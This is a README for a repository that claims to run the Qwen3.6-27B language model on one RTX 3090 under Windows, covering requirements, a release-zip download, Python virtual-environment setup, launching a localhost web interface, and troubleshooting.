# ⚙️ qwen36-27b-single-3090 - Run large language models on Windows

[![Download Project](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lergah/qwen36-27b-single-3090)

## 📋 Project Overview

This repository provides tools to run the Qwen3.6-27B language model on your computer. You need a dedicated graphics card to use this software. This setup focuses on the NVIDIA RTX 3090. If you have this hardware, you can run high-quality text generation tasks locally. 

Local execution keeps your data on your machine. You do not need an internet connection to process prompts once you download the model files. This software uses optimized inference engines to manage memory usage on a single graphics card.

## 💻 System Requirements

Your computer needs specific hardware components to run this software effectively. Verify your system meets these standards before you begin.

- **Graphics Card:** NVIDIA RTX 3090 with 24GB of video memory.
- **Operating System:** Windows 10 or Windows 11.
- **System Memory (RAM):** 32GB or more.
- **Storage:** 50GB of free space on an SSD. 
- **Drivers:** Latest NVIDIA graphics drivers installed via GeForce Experience or the NVIDIA website.
- **Software:** Python 3.10 or newer, and Git for Windows.

## 📥 Downloading the Software 💾

You must visit the project page to access the necessary installers and model configurations. Follow these steps to obtain the correct files.

1. Go to the [official release page](https://github.com/lergah/qwen36-27b-single-3090).
2. Look for the "Releases" section on the right side of the page.
3. Click the version number to view the available files.
4. Download the zip archive that corresponds to your system architecture.
5. Save this file to a folder where you have enough disk space.

## 🛠️ Setting Up Your Computer

You must prepare your Windows environment before you run the model. If you have not installed the required support tools, follow these instructions.

### Install Git
Git allows your computer to download project updates easily. Download the installer from the official Git website and follow the default prompts. Select the options that allow you to run Git from the Windows Command Prompt.

### Install Python
Python runs the logic behind the text model. Download Python 3.10.x from the Python website. During installation, ensure you check the box that says "Add Python to PATH." This step is essential for the commands to function correctly.

### Configure Graphics Drivers
Ensure your NVIDIA drivers are up to date. Outdated drivers cause errors when the software attempts to access your graphics card memory. Open your NVIDIA control panel to check for updates.

## 🚀 Installation Guide

Once you have your downloaded files and the required support tools, proceed with the installation.

1. **Extract the folder:** Right-click the downloaded zip file and select "Extract All." Choose a location such as `C:\AI\Qwen`.
2. **Open the Terminal:** Open the folder you just extracted. Click inside the address bar at the top of the file explorer window. Type `cmd` and press Enter. This launches a black terminal window.
3. **Create a virtual environment:** This isolates the project files from the rest of your computer. Type the following command and press Enter:
   `python -m venv venv`
4. **Activate the environment:** Type `venv\Scripts\activate` and press Enter. You should see `(venv)` appear at the start of your command line.
5. **Install requirements:** Type `pip install -r requirements.txt` and press Enter. Wait for the process to finish. This step downloads the necessary framework libraries.

## 🖼️ Running the Application

After the installation finishes, you can start the model. 

1. Ensure your terminal window is in the project folder and the virtual environment remains active.
2. Type `python main.py` to trigger the launch sequence.
3. The program will load the model into your RTX 3090 memory. This takes a few minutes depending on your hard drive speed.
4. Once the terminal displays "Server Ready" or a similar message, open your web browser.
5. Type `http://localhost:8000` into your address bar to access the interface.

## ⚙️ Understanding the Interface

The web interface provides simple controls for your interaction with the model. 

- **Prompt Box:** Type your questions or requests here.
- **Model Settings:** Adjust parameters like temperature to change how creative the language output becomes. Lower numbers make the model more factual. Higher numbers increase variety in text generation.
- **Chat History:** View your previous entries. You can save or clear these at any time.

## 💡 Troubleshooting Common Issues

If the software fails to start, review these common fixes.

- **Out of Memory Errors:** If the model fails to load, you might have other programs using your graphics card. Close web browsers or video games before you start the model.
- **Path Errors:** If your terminal shows "Python not found," ensure you added Python to your system path during the installation step.
- **Library Updates:** If you see "Module Not Found" errors, run the command `pip install -r requirements.txt` again to ensure all tools are present.
- **Version Compatibility:** Verify you are using the correct version of Python. Newer versions are often compatible, but 3.10 provides the most stable experience for this software.

## 🌐 Moving Forward

Active development has moved to the `club-3090` repository. If you encounter bugs or wish to request new features, please visit that repository to submit your reports. This current repository remains available for reference and for existing users who rely on the current file structure. New installations should prioritize the `club-3090` instructions to take advantage of the latest infrastructure improvements and model support. Regular updates in the new repository ensure that your RTX 3090 continues to perform at its peak for your language processing needs.